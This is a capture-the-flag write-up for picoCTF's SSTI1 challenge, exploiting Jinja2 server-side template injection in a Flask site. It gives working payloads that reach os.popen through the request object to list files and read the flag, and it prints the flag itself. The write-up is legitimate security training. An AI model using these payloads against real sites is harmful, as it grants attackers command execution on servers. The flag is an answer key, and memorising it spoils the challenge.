# picoCTF – SSTI1

## Challenge Information

* **CTF Name:** picoCTF
* **Challenge Name:** SSTI1
* **Category:** Web Exploitation
* **Difficulty:** Easy
* **Description:**
  A website allows users to submit announcements. The goal is to test for vulnerabilities and retrieve the flag.

---

## TL;DR (Summary)

The application is vulnerable to Jinja2 Server-Side Template Injection. By accessing Python internals through the request object, arbitrary commands are executed to read the flag.

---

## Thought Process & Approach

The description hints at templating, which strongly suggests SSTI. The plan is to confirm template evaluation, then escalate to code execution.

---

## Analysis / Discovery

### Step 1 – Confirm SSTI

Payload:

```
{{7*7}}
```

Observation:

```
49
```

Inference:

* Input is evaluated as a template
* SSTI confirmed

---

### Step 2 – Explore Available Objects

Key object:

```
request
```

Inference:

* Flask exposes request object in templates
* Can be used to reach Python internals

Access chain:

```
request → application → __globals__ → __builtins__
```

---

## Exploitation / Steps

### Step 3 – List Files

Payload:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Observation:

* File named `flag` is present

---

### Step 4 – Read Flag

Payload:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

---

## Result

Output:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

---

## Final Answer

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```
